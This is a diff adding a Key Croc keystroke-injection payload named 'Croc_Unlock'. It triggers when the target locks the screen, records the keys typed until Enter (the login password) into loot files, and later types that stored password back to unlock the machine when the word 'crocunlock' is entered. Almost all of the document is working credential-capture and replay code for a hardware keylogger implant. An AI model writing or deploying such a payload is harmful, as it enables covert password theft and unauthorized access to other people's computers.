@@ -1,0 +1,86 @@
+# Title:           Croc_Unlock
+# Description:     Save target passwd with SAVEKEYS command by pressing GUI-l or CONTROL-ALT-L
+#                  Log in with typing crocunlock, save at /loot/Croc_Pot/Croc_unlock.txt.filtered and /tools/Croc_Pot/Croc_unlock.txt.filtered
+# Author:          Spywill
+# Version:         2.3
+# Category:        Key Croc
+# Props:           RootJunky
+
+MATCH (crocunlock|GUI-l|CONTROL-ALT-L)
+
+UNLOCK_TMP="/tmp/unlock_Count.txt"
+SAVE_PASSWD="/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered"
+
+CROC_POT_DIR=(/root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot)
+for dir in "${CROC_POT_DIR[@]}"; do [[ ! -d "$dir" ]] && mkdir "$dir" || LED B; done
+
+UNLOCK_FILE() {
+	until [ -f $SAVE_PASSWD ]; do
+		:
+	done
+	sed -i '/\b'$(sed -n 1p $SAVE_PASSWD)'\b/!d' $SAVE_PASSWD
+	LED G
+	sleep 1
+	LED OFF
+}
+
+UNLOCK_COUNT() {
+	if [ -f $UNLOCK_TMP ]; then
+		i=$(sed -n 1p $UNLOCK_TMP)
+		echo "$(( $i + 1 ))" > $UNLOCK_TMP
+	else
+		echo "$(( i++ ))" > $UNLOCK_TMP
+		if [ -f $SAVE_PASSWD ]; then
+			sed -i '/\b'$(sed -n 1p $SAVE_PASSWD)'\b/!d' $SAVE_PASSWD
+			cat $SAVE_PASSWD >> /root/udisk/loot/Croc_Pot/Croc_unlock.txt.filtered
+			rm -f $SAVE_PASSWD /root/udisk/tools/Croc_Pot/Croc_unlock.txt
+		fi
+	fi
+	sleep 1
+}
+
+RELOAD() {
+	killall -9 bash
+	killall -9 python
+	sleep 1
+	RELOAD_PAYLOADS
+}
+
+case $LOOT in
+	"GUI-l" | "CONTROL-ALT-L")
+		UNLOCK_COUNT
+		if [ "$(sed -n 1p $UNLOCK_TMP)" -gt "0" ]; then
+			UNLOCK_FILE
+			RELOAD
+		elif [ "$(sed -n 1p $UNLOCK_TMP)" -eq "0" ]; then
+			QUACK BACKSPACE
+SAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER
+			LED ATTACK
+			UNLOCK_FILE
+		fi
+;;
+	crocunlock)
+		if [ -f $SAVE_PASSWD ]; then
+			UNLOCK_FILE
+			LED SETUP
+			QUACK BACKSPACE
+			QUACK BACKSPACE
+			QUACK BACKSPACE
+			QUACK BACKSPACE
+			QUACK BACKSPACE
+			QUACK BACKSPACE
+			QUACK BACKSPACE
+			QUACK BACKSPACE
+			QUACK BACKSPACE
+			QUACK BACKSPACE
+			QUACK DELAY 1000
+			QUACK STRING "$(sed '$!d' $SAVE_PASSWD)"
+			QUACK ENTER
+			LED OFF
+			RELOAD
+		else
+			LED R
+			RELOAD
+		fi
+;;
+esac
